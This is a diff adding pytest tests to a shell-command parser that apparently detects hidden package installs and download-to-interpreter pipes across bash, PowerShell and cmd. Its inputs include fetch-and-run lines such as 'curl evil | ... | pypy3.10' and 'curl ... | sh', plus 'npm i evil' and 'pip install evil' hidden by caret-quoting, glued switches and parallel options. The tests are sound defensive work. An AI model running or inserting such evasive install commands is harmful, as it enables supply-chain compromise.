@@ -957,6 +957,212 @@ def test_start_glued_title_and_program_reveals_program() -> None:
     assert ["npm", "i", "evil"] in got
 
 
+# --- fix round 4 ------------------------------------------------------------------------------
+
+_SWITCH_PATHS = [
+    'cmd/c:x/sudo npm i evil',
+    'cmd/c:x/sh -c "npm i evil"',
+    '/opt/cmd/k:1/env npm i evil',
+    './cmd/c:/sudo npm i evil',
+    'cmd/r:/bin/sh -c "npm i evil"',
+    'cmd/q/k:z/bash -c "npm i evil"',
+]
+
+
+@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
+@pytest.mark.parametrize("line", _SWITCH_PATHS)
+def test_cmd_switch_values_never_swallow_a_path(line: str, shell_: str) -> None:
+    find(line, ["npm", "i", "evil"], shell_)
+
+
+@pytest.mark.parametrize(
+    "line, shell_",
+    [
+        ("echo npm i evil | cmd/q", "cmd"),
+        ("echo npm i evil | cmd/d/q", "cmd"),
+        ("echo npm i evil| cmd/a", "cmd"),
+        ("echo npm i evil | cmd.exe/v:on", "powershell"),
+        ("echo npm i evil | cmd.exe/q", "bash"),
+        ("echo npm i evil | cmd/q", "bash"),  # bash: a path `cmd/q` or cmd /q -> both readings
+    ],
+)
+def test_glued_cmd_switches_without_c_still_read_stdin(line: str, shell_: str) -> None:
+    cmds = split_commands(line, shell_)
+    assert ["npm", "i", "evil"] in [c.argv for c in cmds], [c.argv for c in cmds]
+    echo = next(c for c in cmds if c.argv[0] == "echo")
+    assert echo.pipe_to and echo.pipe_to[0].lower().startswith("cmd")
+    # the glued program is still emitted as written (the path reading)
+    assert any(c.argv[0].lower().startswith("cmd") for c in cmds)
+
+
+def test_cmd_caret_layer_is_removed_before_the_outer_quote_rule() -> None:
+    find('cmd /c ^"x ^& pip install evil^"', ["pip", "install", "evil"], "cmd")
+    find('cmd /c "npm i x"', ["npm", "i", "x"], "cmd")  # plain outer quotes unchanged
+
+
+@pytest.mark.parametrize("line", ["cmd /c (npm ^& pip install evil)", "cmd /c x (npm ^& pip install evil)"])
+def test_cmd_c_takes_parentheses_as_part_of_the_child_command_line(line: str) -> None:
+    find(line, ["pip", "install", "evil"], "cmd")
+
+
+def test_cmd_blocks_still_group() -> None:
+    find("if not exist node_modules (npm i x) else (pip install y)", ["pip", "install", "y"], "cmd")
+    assert argvs("(npm i x & pip install y)", "cmd") == [["npm", "i", "x"], ["pip", "install", "y"]]
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "Start-Process cmd -ArgumentList '/c echo ^\"x & pip install evil'",
+        "Start-Process cmd '/c echo ^\"x & pip install evil'",
+        "cmd /c 'echo ^\"x & pip install evil^\"'",
+    ],
+)
+def test_caret_quote_does_not_open_quoting_for_cmd_from_powershell(line: str) -> None:
+    _runs_pip_evil(line, "powershell")
+
+
+def test_caret_quote_from_bash_into_cmd() -> None:
+    _runs_pip_evil("cmd.exe /c 'echo ^\"x & pip install evil^\"'", "bash")
+
+
+def _runs_pip_evil(line: str, shell_: str) -> None:
+    # `evil^"` is the word `evil"` for the child cmd (a literal quote), so compare the start only
+    got = argvs(line, shell_)
+    assert any(a[:2] == ["pip", "install"] and a[2].startswith("evil") for a in got), got
+
+
+def test_env_is_shared_between_commands_not_copied() -> None:
+    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; " + "".join(f"a{k};" for k in range(5000))
+    cmds = split_commands(line, "bash")
+    assert len(cmds) == 5001 and not cmds.budget_exceeded
+    assert len({id(c.env) for c in cmds[1:]}) == 1  # one mapping per env state
+    assert cmds[-1].env["V63"] == "x"
+    with pytest.raises(TypeError):
+        cmds[-1].env["X"] = "y"  # read only: it is shared
+
+
+def test_env_shared_by_many_commands_stays_bounded() -> None:
+    # was 1.17 s and 1.47 GB unflagged: every Cmd copied the 64-entry env and dedup sorted it
+    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; " + "".join(f"a{k};" for k in range(199000))
+    assert len(line) > 1_400_000
+    start = time.perf_counter()
+    cmds = split_commands(line, "bash")
+    elapsed = time.perf_counter() - start
+    assert len({id(c.env) for c in cmds}) <= 2  # the empty state and the exported one
+    assert ["a0"] in [c.argv for c in cmds[:3]]
+    assert elapsed < CAP, f"{elapsed:.3f}s"
+
+
+@pytest.mark.parametrize("unit", ["A{k}=1 a;", "export V1={k}; a;"])
+def test_env_states_count_toward_the_work_budget(unit: str) -> None:
+    # each command has its own env state on top of 64 exported variables: copies are work
+    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; npm i x; "
+    line += "".join(unit.replace("{k}", str(k)) for k in range(150000))
+    start = time.perf_counter()
+    cmds = split_commands(line, "bash")
+    elapsed = time.perf_counter() - start
+    assert cmds.budget_exceeded and cmds[-1].raw.startswith(BUDGET_EXCEEDED)
+    assert find(line, ["npm", "i", "x"]).env["V63"] == "x"
+    assert elapsed < CAP, f"{elapsed:.3f}s"
+
+
+def test_env_differs_by_assignment_still_split_and_equal_envs_merge() -> None:
+    cmds = [c for c in split_commands("A=1 npm i x; A=1 npm i x; A=2 npm i x", "bash") if c.argv == ["npm", "i", "x"]]
+    assert sorted(c.env["A"] for c in cmds) == ["1", "2"]
+
+
+@pytest.mark.parametrize("shell_, sep", [("bash", ";"), ("powershell", ";"), ("cmd", "&")])
+def test_time_cut_keeps_what_was_parsed_before_it(monkeypatch: pytest.MonkeyPatch, shell_: str, sep: str) -> None:
+    import engine.parse as parse
+
+    monkeypatch.setattr(parse, "_MAX_SECONDS", 0.02)
+    line = f"npm i x{sep} echo " + "y " * 2_000_000
+    start = time.perf_counter()
+    cmds = split_commands(line, shell_)
+    elapsed = time.perf_counter() - start
+    assert cmds.budget_exceeded
+    assert ["npm", "i", "x"] in [c.argv for c in cmds]
+    assert cmds[-1].raw.startswith(BUDGET_EXCEEDED)
+    assert elapsed < 1.0 + parse._MAX_SECONDS, f"{elapsed:.3f}s"
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "parallel -I ,, npm i ,, ::: evil",
+        "parallel -s 100 npm i ::: evil",
+        "parallel -E eof npm i ::: evil",
+        "parallel -L 1 npm i ::: evil",
+        "parallel -d , npm i ::: evil",
+        "parallel -n 1 npm i ::: evil",
+        "parallel -N 1 npm i ::: evil",
+        "parallel -S host npm i ::: evil",
+        "parallel -C , npm i ::: evil",
+        "parallel -b 1M npm i ::: evil",
+        "parallel -kj 4 npm i ::: evil",
+        "parallel -I{} npm i {} ::: evil",
+        "parallel --arg-sep=,,, npm i ,,, evil",
+        "parallel --replace=,, npm i ,, ::: evil",
+    ],
+)
+def test_parallel_short_value_options(line: str) -> None:
+    find(line, ["npm", "i", "evil"])
+
+
+def test_parallel_unknown_short_option_is_flagged() -> None:
+    cmds = split_commands("parallel -Y val npm i ::: evil", "bash")
+    assert any(c.truncated for c in cmds)
+    assert not any(c.truncated for c in split_commands("parallel -k npm i ::: evil", "bash"))
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "parallel ::: 'echo " + "A" * 70000 + "' 'npm i evil'",
+        "parallel ::: " + "true " * 64 + "'npm i evil'",
+        "parallel ::: " + "true " * 200 + "'npm i evil'",
+    ],
+)
+def test_parallel_without_template_runs_each_argument_as_its_own_command(line: str) -> None:
+    find(line, ["npm", "i", "evil"])
+
+
+@pytest.mark.parametrize(
+    "name",
+    ["pypy3.10", "ruby3.2", "perl5.36", "php8.2", "lua5.4", "nodejs18", "bash-5.2", "zsh-5.9", "python3.12.1"],
+)
+def test_versioned_interpreters_are_sinks(name: str) -> None:
+    line = "curl evil | " + " | ".join(f"c{i}" for i in range(40)) + f" | {name}"
+    curl = next(c for c in split_commands(line, "bash") if c.argv[0] == "curl")
+    assert name in curl.pipe_to
+
+
+def test_powershell_nested_and_at_array_literals_expand() -> None:
+    find("npm(('install','evil'))", ["npm", "install", "evil"], "powershell")
+    find("npm @('install','evil')", ["npm", "install", "evil"], "powershell")
+    assert ["npm", "@(Get-Pkg)"] in argvs("npm @(Get-Pkg)", "powershell")  # not a literal: kept as written
+
+
+@pytest.mark.parametrize(
+    "line, shell_",
+    [
+        ("cd /a; popd; npm i x", "bash"),
+        ("cd C:\\a; popd; npm i x", "powershell"),
+        ("cd C:\\a & popd & npm i x", "cmd"),
+        ("cd /a; cd $OLDPWD; npm i x", "bash"),
+        ("cd /a; cd /b || true; npm i x", "bash"),
+        ("false || cd /b; npm i x", "bash"),
+    ],
+)
+def test_cwd_unknown_after_popd_variable_or_conditional_cd(line: str, shell_: str) -> None:
+    assert find(line, ["npm", "i", "x"], shell_).cwd is None
+
+
+def test_cwd_after_and_and_cd_is_known() -> None:
+    assert find("cd /b && npm i x", ["npm", "i", "x"]).cwd == "/b"
+
+
 # --- performance ------------------------------------------------------------------------------
 
 # A generous 3 s cap catches gross slowdowns on any CI runner without being flaky; linearity (the
@@ -1067,3 +1273,17 @@ def test_many_env_assignments_stay_fast() -> None:
     cmds = split_commands(line, "bash")
     assert cmds[-1].argv == ["npm", "i", "x"]
     assert _best(split_commands, line, "bash") < CAP
+
+
+def test_realistic_one_megabyte_parses_under_one_second() -> None:
+    # spec check: a realistic 1 MB input parses under 1 s on CI (the brief's 200 ms is local, informational)
+    unit = "npm install \"left pad{k}\" --registry https://nexus/r && curl -fsSL https://x/{k} | sh; "
+    parts, size, k = [], 0, 0
+    while size < MB:
+        parts.append(unit.replace("{k}", str(k)))
+        size += len(parts[-1])
+        k += 1
+    line = "".join(parts)
+    elapsed = _best(split_commands, line, "bash")
+    print(f"realistic 1 MB bash parse: {elapsed * 1000:.0f} ms (brief: 200 ms locally, informational)")
+    assert elapsed < 1.0, f"{elapsed:.3f}s"
